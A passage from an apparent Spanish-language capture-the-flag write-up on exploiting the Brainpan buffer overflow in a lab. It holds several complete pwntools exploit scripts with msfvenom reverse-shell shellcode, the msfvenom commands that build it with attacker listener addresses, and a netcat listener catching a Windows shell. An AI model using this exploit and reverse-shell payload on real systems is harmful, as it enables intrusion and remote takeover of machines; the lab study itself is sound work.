shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xeb\xe5\x47\x79\x6a\x66\x9a\xae\x4c\x57\x55</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xa3\x8d\x90\x88\x4e\xdf\x49\xc6\xfd\xcf\xfe</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x92\x3d\x64\x4c\x32\x46\x99\x05\x35\x67\x0c</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x1d\x6c\xa7\xaf\xf2\x04\xee\xb7\x17\x20\xb8</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x4c\xe3\xde\x3b\x84\x3d\x1e\x97\xe9\xf1\xed</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xe9\x2e\x35\x0e\x9c\x46\x45\xb3\xa7\x9d\x37</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x6f\x2d\x05\x9f\xe4\x95\xe1\x21\x28\x43\x62</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x2d\x85\x07\x2c\x32\x18\xcb\x47\x4e\x91\xea</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x87\xc6\xe1\xc8\x03\x82\xb2\x71\x12\x6e\x14</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x8d\x44\xd1\xc9\x2b\x0f\xfc\x1e\x46\x52\x69</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xd2\x6b\x6c\x69\x7c\xfb\x1f\x5b\x23\x57\xb7</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xd7\xac\x71\x40\x17\x87\xc6\xde\xe6\x28\x37</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xf7\x2c\x7c\x67\x6f\x84\xfd\xec\x6f\x29\x28</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xa2\x3f\x85\x83\x03\xef\x65\x74\xec\xe5\x69</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xab\x0c\x06\xa0\xc4\xa7\xfd\x23\x2b\x9f\x99</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xe6\xc3\xe2\x61\x08\xaf\x6a\x87\x60\xdf\x3a</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x10\x1d\x46\x67\xea\xbc\x87\xbd\x97\xff\x0c</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x32\x68\xb1\xe4\x3f\x7a\x26\x05\x0a\x20\xe1</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x1a\xa0\x4c\x6d\x88\x2f\x8c\xf8\xb1\xe7\xdb</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xad\x04\xfe\x89\x43\x3e\xa8\xaf\x99\xa6\x93</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x6b\x46\x1b\x1d\x72\x0b\x27\x39\x64\xd5\xa8</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x05\xd0\x89\xfe\xd3\x8e\x6f\xa9\x95\x78\x26</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x06\x7c\xec\xbf\x64\xbf\x6a\xc0\xa0\x49\x92</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x71\x1d\x0c\xad\xbe\xc9\x98\xd6\xa2\x69\x66</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x0d\x67\x99\x2d\x0f\xce\x32\xe8\xda\x52\x5f</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x0b\x31\x90\x66\x88\xb3\x69\x9d\x90\xb6\x6c</span><span class="s">"</span><span class="p">  
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xd9\x16\x2b\x1d\x72\xf3\x4b\xb2\x73\xd6</span><span class="s">"</span><span class="p">

payload </span><span class="o">= </span><span class="p">junk </span><span class="o">+ </span><span class="p">jmpesp </span><span class="o">+ </span><span class="p">nops </span><span class="o">+ </span><span class="p">shellcode

shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"192.168.100.5"</span><span class="p">, </span><span class="mi">9999</span><span class="p">)

shell.sendline(payload)
shell.close()</span>
</code></pre></div></div><br>

<p class="plain-text">Los <code class="language-plaintext highlighter-rouge">nops</code> no ejecutaran nada antes del shellcode pero al llegar a la instruccion de <code class="language-plaintext highlighter-rouge">fnstenv</code> y este sobreescriba <code class="language-plaintext highlighter-rouge">16</code> bytes despues del <code class="language-plaintext highlighter-rouge">ESP</code> sobreescribira los nops del inicio sin llegar a tocar el <code class="language-plaintext highlighter-rouge">shellcode</code> por lo que este no se corrompera como antes</p>
<a href="/vulnhub/brainpan1/21.png" target="_blank"><div><p><img src="/vulnhub/brainpan1/21.png"></p></div></a>
<a href="/vulnhub/brainpan1/22.png" target="_blank"><div><p><img src="/vulnhub/brainpan1/22.png"></p></div></a>

<p class="plain-text">Otra forma es usar un <code class="language-plaintext highlighter-rouge">opcode</code> que desplaze la pila 16 unidades que en hex es <code class="language-plaintext highlighter-rouge">0x10</code>, el proposito es el mismo, hacer que el <code class="language-plaintext highlighter-rouge">ESP</code> este 16 bytes atras para cuando los sobreescriba en la instruccion <code class="language-plaintext highlighter-rouge">fnstenv</code> no llegue a sobreescribir shellcode</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="c1">#!/usr/bin/python3
</span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">remote, p32, asm

offset </span><span class="o">= </span><span class="mi">524</span><span class="p">
junk </span><span class="o">= </span><span class="no">b</span><span class="s">"A"</span><span class="o"> * </span><span class="p">offset

opcode </span><span class="o">= </span><span class="p">asm(</span><span class="s">"sub esp, 0x10"</span><span class="p">)
jmpesp </span><span class="o">= </span><span class="p">p32(</span><span class="mi">0x311712f3</span><span class="p">)</span><span class="p">

shellcode </span><span class="o">= </span><span class="no"> b</span><span class="s">"</span><span class="mi"></span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xda\xc2\xd9\x74\x24\xf4\x58\xbd\x91\x4d\xed</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x34\x33\xc9\xb1\x52\x83\xe8\xfc\x31\x68\x13</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x03\xf9\x5e\x0f\xc1\x05\x88\x4d\x2a\xf5\x49</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x32\xa2\x10\x78\x72\xd0\x51\x2b\x42\x92\x37</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xc0\x29\xf6\xa3\x53\x5f\xdf\xc4\xd4\xea\x39</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xeb\xe5\x47\x79\x6a\x66\x9a\xae\x4c\x57\x55</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xa3\x8d\x90\x88\x4e\xdf\x49\xc6\xfd\xcf\xfe</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x92\x3d\x64\x4c\x32\x46\x99\x05\x35\x67\x0c</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x1d\x6c\xa7\xaf\xf2\x04\xee\xb7\x17\x20\xb8</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x4c\xe3\xde\x3b\x84\x3d\x1e\x97\xe9\xf1\xed</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xe9\x2e\x35\x0e\x9c\x46\x45\xb3\xa7\x9d\x37</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x6f\x2d\x05\x9f\xe4\x95\xe1\x21\x28\x43\x62</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x2d\x85\x07\x2c\x32\x18\xcb\x47\x4e\x91\xea</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x87\xc6\xe1\xc8\x03\x82\xb2\x71\x12\x6e\x14</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x8d\x44\xd1\xc9\x2b\x0f\xfc\x1e\x46\x52\x69</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xd2\x6b\x6c\x69\x7c\xfb\x1f\x5b\x23\x57\xb7</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xd7\xac\x71\x40\x17\x87\xc6\xde\xe6\x28\x37</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xf7\x2c\x7c\x67\x6f\x84\xfd\xec\x6f\x29\x28</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xa2\x3f\x85\x83\x03\xef\x65\x74\xec\xe5\x69</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xab\x0c\x06\xa0\xc4\xa7\xfd\x23\x2b\x9f\x99</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xe6\xc3\xe2\x61\x08\xaf\x6a\x87\x60\xdf\x3a</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x10\x1d\x46\x67\xea\xbc\x87\xbd\x97\xff\x0c</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x32\x68\xb1\xe4\x3f\x7a\x26\x05\x0a\x20\xe1</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x1a\xa0\x4c\x6d\x88\x2f\x8c\xf8\xb1\xe7\xdb</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xad\x04\xfe\x89\x43\x3e\xa8\xaf\x99\xa6\x93</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x6b\x46\x1b\x1d\x72\x0b\x27\x39\x64\xd5\xa8</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x05\xd0\x89\xfe\xd3\x8e\x6f\xa9\x95\x78\x26</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x06\x7c\xec\xbf\x64\xbf\x6a\xc0\xa0\x49\x92</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x71\x1d\x0c\xad\xbe\xc9\x98\xd6\xa2\x69\x66</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x0d\x67\x99\x2d\x0f\xce\x32\xe8\xda\x52\x5f</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x0b\x31\x90\x66\x88\xb3\x69\x9d\x90\xb6\x6c</span><span class="s">"</span><span class="p">  
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xd9\x16\x2b\x1d\x72\xf3\x4b\xb2\x73\xd6</span><span class="s">"</span><span class="p">

payload </span><span class="o">= </span><span class="p">junk </span><span class="o">+ </span><span class="p">jmpesp </span><span class="o">+ </span><span class="p">opcode </span><span class="o">+ </span><span class="p">shellcode

shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"192.168.100.5"</span><span class="p">, </span><span class="mi">9999</span><span class="p">)

shell.sendline(payload)
shell.close()</span>
</code></pre></div></div><br>

<p class="plain-text">Y la que creo mas conveniente al menos en este caso especifico es utilizar otro tipo de <code class="language-plaintext highlighter-rouge">encoder</code> como <code class="language-plaintext highlighter-rouge">jmp_call_additive</code> que no tendrá instrucciones en el <code class="language-plaintext highlighter-rouge">ESP</code> como si las tiene el encoder <code class="language-plaintext highlighter-rouge">shikata_ga_nai</code> que es el que msfvenom se usa por <code class="language-plaintext highlighter-rouge">defecto</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">✘</span><span class="p"> -e x86/shikata_ga_nai
</span><span class="ve">✔</span><span class="p"> -e x86/jmp_call_additive  </span>
</code></pre></div></div><br>

<p class="plain-text">Asi que creamos un nuevo <code class="language-plaintext highlighter-rouge">shellcode</code> ahora con el encoder <code class="language-plaintext highlighter-rouge">x86/jmp_call_additive</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ msfvenom</span><span class="p"> -p windows/shell_reverse_tcp LHOST=192.168.100.85 LPORT=443 EXITFUNC=thread -b </span><span class="am">'\x00'</span><span class="p"> -f python -v shellcode -e x86/jmp_call_additive  
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/jmp_call_additive
x86/jmp_call_additive succeeded with size 353 (iteration=0)
x86/jmp_call_additive chosen with final size 353
Payload size: 353 bytes
Final size of python file: 1990 bytes
shellcode =  b""
shellcode += b"\xfc\xbb\x46\xbc\x5d\x42\xeb\x0c\x5e\x56\x31"
shellcode += b"\x1e\xad\x01\xc3\x85\xc0\x75\xf7\xc3\xe8\xef"
shellcode += b"\xff\xff\xff\xba\x54\xdf\x42\x42\xa5\x80\xcb"
shellcode += b"\xa7\x94\x80\xa8\xac\x87\x30\xba\xe0\x2b\xba"
shellcode += b"\xee\x10\xbf\xce\x26\x17\x08\x64\x11\x16\x89"
shellcode += b"\xd5\x61\x39\x09\x24\xb6\x99\x30\xe7\xcb\xd8"
shellcode += b"\x75\x1a\x21\x88\x2e\x50\x94\x3c\x5a\x2c\x25"
shellcode += b"\xb7\x10\xa0\x2d\x24\xe0\xc3\x1c\xfb\x7a\x9a"
shellcode += b"\xbe\xfa\xaf\x96\xf6\xe4\xac\x93\x41\x9f\x07"
shellcode += b"\x6f\x50\x49\x56\x90\xff\xb4\x56\x63\x01\xf1"
shellcode += b"\x51\x9c\x74\x0b\xa2\x21\x8f\xc8\xd8\xfd\x1a"
shellcode += b"\xca\x7b\x75\xbc\x36\x7d\x5a\x5b\xbd\x71\x17"
shellcode += b"\x2f\x99\x95\xa6\xfc\x92\xa2\x23\x03\x74\x23"
shellcode += b"\x77\x20\x50\x6f\x23\x49\xc1\xd5\x82\x76\x11"
shellcode += b"\xb6\x7b\xd3\x5a\x5b\x6f\x6e\x01\x34\x5c\x43"
shellcode += b"\xb9\xc4\xca\xd4\xca\xf6\x55\x4f\x44\xbb\x1e"
shellcode += b"\x49\x93\xbc\x34\x2d\x0b\x43\xb7\x4e\x02\x80"
shellcode += b"\xe3\x1e\x3c\x21\x8c\xf4\xbc\xce\x59\x5a\xec"
shellcode += b"\x60\x32\x1b\x5c\xc1\xe2\xf3\xb6\xce\xdd\xe4"
shellcode += b"\xb9\x04\x76\x8e\x40\xcf\xb9\xe7\x2e\x5a\x52"
shellcode += b"\xfa\xae\x65\x19\x73\x48\x0f\x4d\xd2\xc3\xb8"
shellcode += b"\xf4\x7f\x9f\x59\xf8\x55\xda\x5a\x72\x5a\x1b"
shellcode += b"\x14\x73\x17\x0f\xc1\x73\x62\x6d\x44\x8b\x58"
shellcode += b"\x19\x0a\x1e\x07\xd9\x45\x03\x90\x8e\x02\xf5"
shellcode += b"\xe9\x5a\xbf\xac\x43\x78\x42\x28\xab\x38\x99"
shellcode += b"\x89\x32\xc1\x6c\xb5\x10\xd1\xa8\x36\x1d\x85"
shellcode += b"\x64\x61\xcb\x73\xc3\xdb\xbd\x2d\x9d\xb0\x17"
shellcode += b"\xb9\x58\xfb\xa7\xbf\x64\xd6\x51\x5f\xd4\x8f"
shellcode += b"\x27\x60\xd9\x47\xa0\x19\x07\xf8\x4f\xf0\x83"
shellcode += b"\x18\xb2\xd0\xf9\xb0\x6b\xb1\x43\xdd\x8b\x6c"
shellcode += b"\x87\xd8\x0f\x84\x78\x1f\x0f\xed\x7d\x5b\x97"
shellcode += b"\x1e\x0c\xf4\x72\x20\xa3\xf5\x56\x20\x43\x0a"  
shellcode += b"\x59"</span>
</code></pre></div></div><br>

<p class="plain-text">De esta manera no necesitamos desplazar la pila y seria <code class="language-plaintext highlighter-rouge">junk + jmpesp + shellcode</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="c1">#!/usr/bin/python3
</span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">remote, p32

offset </span><span class="o">= </span><span class="p">524
junk </span><span class="o">= </span><span class="no">b</span><span class="s">"A"</span><span class="o"> * </span><span class="p">offset

jmpesp </span><span class="o">= </span><span class="p">p32(</span><span class="mi">0x311712f3</span><span class="p">)</span><span class="p">

shellcode </span><span class="o">= </span><span class="no"> b</span><span class="s">"</span><span class="mi"></span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xfc\xbb\x46\xbc\x5d\x42\xeb\x0c\x5e\x56\x31</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x1e\xad\x01\xc3\x85\xc0\x75\xf7\xc3\xe8\xef</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xff\xff\xff\xba\x54\xdf\x42\x42\xa5\x80\xcb</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xa7\x94\x80\xa8\xac\x87\x30\xba\xe0\x2b\xba</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xee\x10\xbf\xce\x26\x17\x08\x64\x11\x16\x89</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xd5\x61\x39\x09\x24\xb6\x99\x30\xe7\xcb\xd8</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x75\x1a\x21\x88\x2e\x50\x94\x3c\x5a\x2c\x25</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xb7\x10\xa0\x2d\x24\xe0\xc3\x1c\xfb\x7a\x9a</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xbe\xfa\xaf\x96\xf6\xe4\xac\x93\x41\x9f\x07</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x6f\x50\x49\x56\x90\xff\xb4\x56\x63\x01\xf1</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x51\x9c\x74\x0b\xa2\x21\x8f\xc8\xd8\xfd\x1a</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xca\x7b\x75\xbc\x36\x7d\x5a\x5b\xbd\x71\x17</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x2f\x99\x95\xa6\xfc\x92\xa2\x23\x03\x74\x23</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x77\x20\x50\x6f\x23\x49\xc1\xd5\x82\x76\x11</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xb6\x7b\xd3\x5a\x5b\x6f\x6e\x01\x34\x5c\x43</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xb9\xc4\xca\xd4\xca\xf6\x55\x4f\x44\xbb\x1e</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x49\x93\xbc\x34\x2d\x0b\x43\xb7\x4e\x02\x80</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xe3\x1e\x3c\x21\x8c\xf4\xbc\xce\x59\x5a\xec</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x60\x32\x1b\x5c\xc1\xe2\xf3\xb6\xce\xdd\xe4</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xb9\x04\x76\x8e\x40\xcf\xb9\xe7\x2e\x5a\x52</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xfa\xae\x65\x19\x73\x48\x0f\x4d\xd2\xc3\xb8</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xf4\x7f\x9f\x59\xf8\x55\xda\x5a\x72\x5a\x1b</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x14\x73\x17\x0f\xc1\x73\x62\x6d\x44\x8b\x58</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x19\x0a\x1e\x07\xd9\x45\x03\x90\x8e\x02\xf5</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xe9\x5a\xbf\xac\x43\x78\x42\x28\xab\x38\x99</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x89\x32\xc1\x6c\xb5\x10\xd1\xa8\x36\x1d\x85</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x64\x61\xcb\x73\xc3\xdb\xbd\x2d\x9d\xb0\x17</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xb9\x58\xfb\xa7\xbf\x64\xd6\x51\x5f\xd4\x8f</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x27\x60\xd9\x47\xa0\x19\x07\xf8\x4f\xf0\x83</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x18\xb2\xd0\xf9\xb0\x6b\xb1\x43\xdd\x8b\x6c</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x87\xd8\x0f\x84\x78\x1f\x0f\xed\x7d\x5b\x97</span><span class="s">"</span><span class="p">  
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x1e\x0c\xf4\x72\x20\xa3\xf5\x56\x20\x43\x0a</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x59</span><span class="s">"</span><span class="p">

payload </span><span class="o">= </span><span class="p">junk </span><span class="o">+ </span><span class="p">jmpesp </span><span class="o">+ </span><span class="p">shellcode

shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"192.168.100.5"</span><span class="p">, </span><span class="mi">9999</span><span class="p">)

shell.sendline(payload)
shell.close()</span>
</code></pre></div></div><br>

<p class="plain-text">Ahora al ejecutar este script nos llegua la <code class="language-plaintext highlighter-rouge">shell</code> sin ningun problema como antes</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ python3 </span><span class="p">exploit.py
[</span><span class="ve">+</span><span class="p">] Opening connection to 192.168.100.5 on port 9999: Done  
[</span><span class="az">*</span><span class="p">] Closed connection to 192.168.100.5 port 9999</span>
</code></pre></div></div><br>

<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ sudo netcat</span><span class="p"> -lvnp 443 
Listening on 0.0.0.0 443
Connection received on 192.168.100.5
Microsoft Windows [Versión 10.0.23430.1000]
(c) Microsoft Corporation. Todos los derechos reservados.  

C:\Windows\System32></span><span class="am">whoami</span><span class="p">
DarthBear\pc1

C:\Windows\System32></span>
</code></pre></div></div><br>

</section>

<section class="post" id="shell-puck">
<br><h3 class="post-title">Shell - puck</h3><br>

<p class="plain-text">Ahora que funciona es simplemente crear un nuevo shellcode para la interfaz <code class="language-plaintext highlighter-rouge">tun0</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ msfvenom</span><span class="p"> -p windows/shell_reverse_tcp LHOST=10.8.64.87 LPORT=443 EXITFUNC=thread -b </span><span class="am">'\x00'</span><span class="p"> -f python -v shellcode -e x86/jmp_call_additive  
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/jmp_call_additive
x86/jmp_call_additive succeeded with size 353 (iteration=0)
x86/jmp_call_additive chosen with final size 353
Payload size: 353 bytes
Final size of python file: 1990 bytes
shellcode =  b""
shellcode += b"\xfc\xbb\x8c\x20\xca\x92\xeb\x0c\x5e\x56\x31"
shellcode += b"\x1e\xad\x01\xc3\x85\xc0\x75\xf7\xc3\xe8\xef"
shellcode += b"\xff\xff\xff\x70\xc8\x48\x92\x88\x09\x2d\x1a"
shellcode += b"\x6d\x38\x6d\x78\xe6\x6b\x5d\x0a\xaa\x87\x16"
shellcode += b"\x5e\x5e\x13\x5a\x77\x51\x94\xd1\xa1\x5c\x25"
shellcode += b"\x49\x91\xff\xa5\x90\xc6\xdf\x94\x5a\x1b\x1e"
shellcode += b"\xd0\x87\xd6\x72\x89\xcc\x45\x62\xbe\x99\x55"
shellcode += b"\x09\x8c\x0c\xde\xee\x45\x2e\xcf\xa1\xde\x69"
shellcode += b"\xcf\x40\x32\x02\x46\x5a\x57\x2f\x10\xd1\xa3"
shellcode += b"\xdb\xa3\x33\xfa\x24\x0f\x7a\x32\xd7\x51\xbb"
shellcode += b"\xf5\x08\x24\xb5\x05\xb4\x3f\x02\x77\x62\xb5"
shellcode += b"\x90\xdf\xe1\x6d\x7c\xe1\x26\xeb\xf7\xed\x83"
shellcode += b"\x7f\x5f\xf2\x12\x53\xd4\x0e\x9e\x52\x3a\x87"
shellcode += b"\xe4\x70\x9e\xc3\xbf\x19\x87\xa9\x6e\x25\xd7"
shellcode += b"\x11\xce\x83\x9c\xbc\x1b\xbe\xff\xa8\xe8\xf3"
shellcode += b"\xff\x28\x67\x83\x8c\x1a\x28\x3f\x1a\x17\xa1"
shellcode += b"\x99\xdd\x58\x98\x5e\x71\xa7\x23\x9f\x58\x6c"
shellcode += b"\x77\xcf\xf2\x45\xf8\x84\x02\x69\x2d\x0a\x52"
shellcode += b"\xc5\x9e\xeb\x02\xa5\x4e\x84\x48\x2a\xb0\xb4"
